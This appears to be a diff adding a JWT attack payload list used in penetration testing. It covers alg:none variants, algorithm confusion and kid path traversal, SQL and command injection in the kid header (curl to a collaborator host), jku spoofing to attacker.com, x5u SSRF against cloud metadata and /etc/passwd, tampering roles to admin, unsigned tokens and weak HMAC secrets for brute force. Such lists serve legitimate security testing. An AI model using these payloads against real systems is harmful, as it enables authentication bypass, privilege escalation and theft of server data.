@@ -1,0 +1,59 @@
+# ─── Algorithm None attack ───
+{"typ":"JWT","alg":"none"}
+{"typ":"JWT","alg":"None"}
+{"typ":"JWT","alg":"NONE"}
+{"typ":"JWT","alg":"nOnE"}
+# ─── Algorithm confusion RS256 → HS256 (sign with pubkey as HMAC secret) ───
+{"typ":"JWT","alg":"HS256"}  # then HMAC-SHA256(header.payload, <target RS256 public key PEM>)
+# ─── kid header path traversal ───
+{"typ":"JWT","alg":"HS256","kid":"../../../../etc/passwd"}
+{"typ":"JWT","alg":"HS256","kid":"../../../../dev/null"}
+{"typ":"JWT","alg":"HS256","kid":"/dev/null"}
+# ─── kid SQL injection (backend queries DB by kid) ───
+{"typ":"JWT","alg":"HS256","kid":"a' UNION SELECT 'attacker_secret' -- -"}
+{"typ":"JWT","alg":"HS256","kid":"1 OR 1=1"}
+# ─── kid command injection (backend uses kid in system call) ───
+{"typ":"JWT","alg":"HS256","kid":"a;curl BURP_COLLAB;#"}
+{"typ":"JWT","alg":"HS256","kid":"$(curl BURP_COLLAB)"}
+# ─── jku spoofing — attacker hosts a JWKS ───
+{"typ":"JWT","alg":"RS256","jku":"https://attacker.com/.well-known/jwks.json"}
+{"typ":"JWT","alg":"RS256","jku":"https://target.com/api/user/upload/jwks.json"}  # if user-controlled
+# ─── x5u SSRF via cert URL ───
+{"typ":"JWT","alg":"RS256","x5u":"http://169.254.169.254/latest/meta-data/"}
+{"typ":"JWT","alg":"RS256","x5u":"file:///etc/passwd"}
+# ─── jwk header embedded pubkey (CVE-2018-0114) — attacker provides pubkey ───
+{"typ":"JWT","alg":"RS256","jwk":{"kty":"RSA","n":"<attacker-modulus>","e":"AQAB"}}
+# ─── x5c header — attacker embeds self-signed cert ───
+{"typ":"JWT","alg":"RS256","x5c":["<base64-attacker-cert>"]}
+# ─── payload tampering (test unverified sig acceptance) ───
+{"role":"user"} → {"role":"admin"}  # modify + keep original signature
+{"is_admin":false} → {"is_admin":true}
+{"user_id":1000} → {"user_id":1}  # IDOR via JWT
+# ─── null signature ───
+eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.                    # trailing dot, no sig
+eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiYWRtaW4ifQ                    # no sig at all
+# ─── weak HMAC secrets to brute-force with hashcat mode 16500 ───
+# common weak secrets:
+secret
+password
+123456
+your-256-bit-secret
+JWT-Secret
+your-secret-key
+supersecret
+mysecret
+# ─── audience/scope confusion — token from Service A, target Service B ───
+{"aud":"service-A"}  # replay against service B endpoints
+{"aud":["*"]}
+{"aud":[]}
+# ─── time-claim tampering ───
+{"exp":9999999999}  # far-future expiry
+{"exp":null}
+{"nbf":0}
+{"iat":9999999999}
+# ─── jti replay (predictable/repeated jti = replayable token) ───
+# just re-send the same JWT — server should reject if jti-store implemented
+# ─── deprecated algs — try in order until one accepted ───
+{"typ":"JWT","alg":"HS1"}
+{"typ":"JWT","alg":"HS224"}
+{"typ":"JWT","alg":"MD5"}
